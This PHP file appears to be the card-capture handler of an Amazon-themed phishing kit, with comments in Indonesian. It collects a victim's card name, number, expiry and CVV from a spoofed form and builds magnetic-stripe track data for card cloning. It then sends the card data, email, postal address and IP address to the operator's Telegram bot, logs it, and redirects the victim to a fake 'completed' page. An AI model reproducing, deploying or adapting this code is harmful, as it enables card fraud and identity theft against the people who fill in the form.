<?php
session_start();
require_once '../function.php';
require_once '../system/class/Telegram.php';
require_once '../system/class/creditcard.php';

global $config;

if (!isset($_SESSION['email'])) {
    header('Location: ../views/amazon.html');
    exit;
}

$nama = trim($_POST['nama_kartu'] ?? '');
$nomor = preg_replace('/\s+/', '', $_POST['nomor_kartu'] ?? '');
$exp = trim($_POST['exp'] ?? '');
$cvv = trim($_POST['cvv'] ?? '');

// Buat Track 1 & 2
$nomorBersih = preg_replace('/\D/', '', $nomor);
$expBersih = preg_replace('/\D/', '', $exp);
$bulan = str_pad(substr($expBersih, 0, 2), 2, '0', STR_PAD_LEFT);
$tahun = substr($expBersih, -2);

$track1 = "%B{$nomorBersih}^{$nama}/USER^{$bulan}{$tahun}000000000000000?";
$track2 = ";{$nomorBersih}={$bulan}{$tahun}000000000000000?";

// Kirim ke Telegram
if ($config['kirim_ke_telegram']) {
    $tg = new Telegram($config['telegram_bot_token'], $config['telegram_chat_id']);
    $pesan = $tg->formatKartu(
        $_SESSION['email'],
        $nama,
        chunk_split($nomorBersih, 4, ' '),
        $exp,
        $cvv,
        $track1,
        $track2,
        $_SESSION['alamat'] . ', ' . $_SESSION['kota'] . ' - ' . $_SESSION['kode_pos'] . ' (' . $_SESSION['negara'] . ')',
        $_SESSION['ip']
    );
    $tg->kirim($pesan);
    simpanLog('card', "Email: {$_SESSION['email']} | Kartu: {$nomorBersih} | IP: {$_SESSION['ip']}");
}

// Selesai → alihkan
header('Location: ../views/completed.html');
exit;